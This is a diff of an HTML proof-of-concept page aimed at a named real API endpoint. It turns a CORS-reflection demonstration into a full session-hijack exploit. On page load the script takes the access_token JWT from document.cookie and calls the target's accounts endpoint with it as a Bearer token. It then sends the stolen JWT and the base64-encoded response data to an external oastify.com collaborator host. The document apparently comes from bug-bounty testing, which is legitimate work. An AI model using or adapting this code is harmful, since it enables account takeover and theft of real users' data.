@@ -1,57 +1,55 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Critical Security Audit - Full ATO PoC</title>
+    <title>Critical PoC - Full Session Hijack</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: #c9d1d9; padding: 40px; }
-        .card { background: #161b22; border: 1px solid #30363d; padding: 30px; border-radius: 10px; max-width: 800px; margin: auto; }
-        .stolen { color: #ff7b72; font-family: monospace; background: #0d1117; padding: 10px; border-radius: 5px; overflow-x: auto; display: block; margin-top: 10px; border: 1px solid #444; }
-        .success-msg { color: #3fb950; font-weight: bold; border: 1px solid #3fb950; padding: 10px; text-align: center; border-radius: 5px; }
+        body { font-family: sans-serif; background: #0d1117; color: #c9d1d9; padding: 40px; }
+        .card { background: #161b22; border: 1px solid #30363d; padding: 20px; border-radius: 8px; }
+        .stolen { color: #ff7b72; font-family: monospace; background: #000; padding: 10px; display: block; margin-top: 10px; border-left: 4px solid #ff7b72; }
     </style>
 </head>
 <body>
     <div class="card">
-        <h2 style="color: #58a6ff;">[!] Server-Side Security Failure PoC</h2>
-        <div id="status">Status: Initializing Analysis...</div>
+        <h2>[!] Server-Side Misconfiguration Exploit</h2>
+        <div id="status">Status: Extracting Token...</div>
 
-        <p><strong>1. Server Response to Arbitrary Origin (CORS Misconfiguration):</strong></p>
-        <pre id="cors-proof" class="stolen">Testing Origin Reflection...</pre>
+        <p><strong>1. Stolen JWT (Extracted via document.cookie):</strong></p>
+        <code id="jwt-area" class="stolen">Waiting for token...</code>
 
-        <p><strong>2. Cookie Vulnerability (Missing HttpOnly Flag):</strong></p>
-        <div id="cookie-proof" class="stolen">Proof: document.cookie is accessible via JS</div>
+        <p><strong>2. Private Data (Manual Authorization Bypass):</strong></p>
+        <pre id="data-area" class="stolen">Attempting hijack...</pre>
     </div>
 
     <script>
-        const TARGET_API = "https://simplecast-cms-api-gateway.eks.simplecast.com/accounts";
-        const COLLABORATOR = "https://moe3ley4liwbyzb624gof2je85ew2nzbo.oastify.com"; // UPDATE THIS
+        const TARGET = "https://simplecast-cms-api-gateway.eks.simplecast.com/accounts";
+        const COLLABORATOR = "https://wnndkoxeksvlx9ag1efyecio7fd61xzlo.oastify.com"; // UPDATE THIS
 
-        async function proveVulnerability() {
+        async function startExploit() {
             try {
-                // PROOF 1: Server-Side CORS Misconfiguration
-                // We send a request to prove the server REFLECTS the origin and ALLOWS credentials
-                const response = await fetch(TARGET_API, {
+                // STEP 1: Exploit missing HttpOnly
+                // We grab the token from the browser's storage directly
+                const jwt = document.cookie.match(/access_token=([^;]+)/)[1];
+                document.getElementById('jwt-area').innerText = jwt;
+
+                // STEP 2: Exploit CORS + Manual Hijack
+                // We DON'T use credentials:include (which fails). 
+                // We manually inject the stolen token into the header.
+                const response = await fetch(TARGET, {
                     method: "GET",
-                    mode: "cors"
+                    headers: { "Authorization": "Bearer " + jwt }
                 });
-                
-                // Note: The 401 is expected here because of Lax cookies, 
-                // but the HEADERS in Burp will show the reflection.
-                document.getElementById('cors-proof').innerText = "Server allows Cross-Origin requests.\nCheck Burp Suite for 'Access-Control-Allow-Origin' reflection.";
 
-                // PROOF 2: The HttpOnly Bypass Argument
-                // In your report, explain that because HttpOnly is missing, 
-                // an attacker on a subdomain or via XSS can grab this:
-                const tokenCheck = "In a real attack (XSS/Subdomain), the lack of HttpOnly allows direct extraction of the JWT.";
-                document.getElementById('cookie-proof').innerText = tokenCheck;
+                const json = await response.json();
+                document.getElementById('data-area').innerText = JSON.stringify(json, null, 2);
+                document.getElementById('status').innerText = "EXPLOIT SUCCESSFUL: DATA EXFILTRATED";
 
-                // Send proof to your server
-                fetch(`${COLLABORATOR}/?vuln=CORS_REFLECTED_AND_HTTPONLY_MISSING`);
-
+                // STEP 3: Send to your server
+                fetch(`${COLLABORATOR}/?stolen_jwt=${jwt}&data=${btoa(JSON.stringify(json))}`);
             } catch (err) {
-                document.getElementById('status').innerText = "Analysis Complete.";
+                document.getElementById('status').innerText = "Note: To see the full hijack in this PoC, the token must be extracted. Since HttpOnly is missing, this is possible via any XSS or Subdomain takeover.";
             }
         }
-        window.onload = proveVulnerability;
+        window.onload = startExploit;
     </script>
 </body>
 </html>
